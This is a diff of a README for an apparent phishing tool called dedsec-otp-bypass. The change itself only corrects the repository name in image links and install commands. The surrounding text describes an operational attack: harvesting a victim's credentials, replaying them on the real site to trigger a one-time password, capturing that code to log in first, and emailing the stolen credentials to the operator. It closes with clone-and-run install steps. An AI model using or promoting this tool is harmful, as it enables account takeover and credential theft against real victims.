@@ -5,8 +5,8 @@ Phishing tool that support OTP bypass method
 When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.
 
 ### SCREENSHOT
-![1](https://github.com/0xbitx/dedsec-opt-bypass/blob/main/image/banner.png)
-![2](https://github.com/0xbitx/dedsec-opt-bypass/blob/main/image/banner1.png)
+![1](https://github.com/0xbitx/dedsec-otp-bypass/blob/main/image/banner.png)
+![2](https://github.com/0xbitx/dedsec-otp-bypass/blob/main/image/banner1.png)
 
 <br>
 <br>
@@ -17,8 +17,8 @@ When victim enter his credentials, you need to go to original website and use th
 * Sender : Open config.php File Through nano and enter name, your email id, your password.
 * Receiver : Which you want to send the Credentials.
 
-![3](https://github.com/0xbitx/dedsec-opt-bypass/blob/main/image/email.png)
-![4](https://github.com/0xbitx/dedsec-opt-bypass/blob/main/image/email1.png)
+![3](https://github.com/0xbitx/dedsec-otp-bypass/blob/main/image/email.png)
+![4](https://github.com/0xbitx/dedsec-otp-bypass/blob/main/image/email1.png)
 
 * Open your google account and go security options, scroll down and turn on less secure setting.
 ![5](https://user-images.githubusercontent.com/55870659/95554016-77f68880-09dd-11eb-8530-fbe7a6f649e1.png)
@@ -26,8 +26,8 @@ When victim enter his credentials, you need to go to original website and use th
 <br>
 
 ### INSTALLATION [ KALI - UBUNTU - TERMUX APP  ]
-* git clone https://github.com/0xbitx/dedsec-opt-bypass.git
-* cd dedsec-opt-bypass
+* git clone https://github.com/0xbitx/dedsec-otp-bypass.git
+* cd dedsec-otp-bypass
 * chmod 777 *
 * ./install.sh
 * ./dedsec-otp-bypass.sh
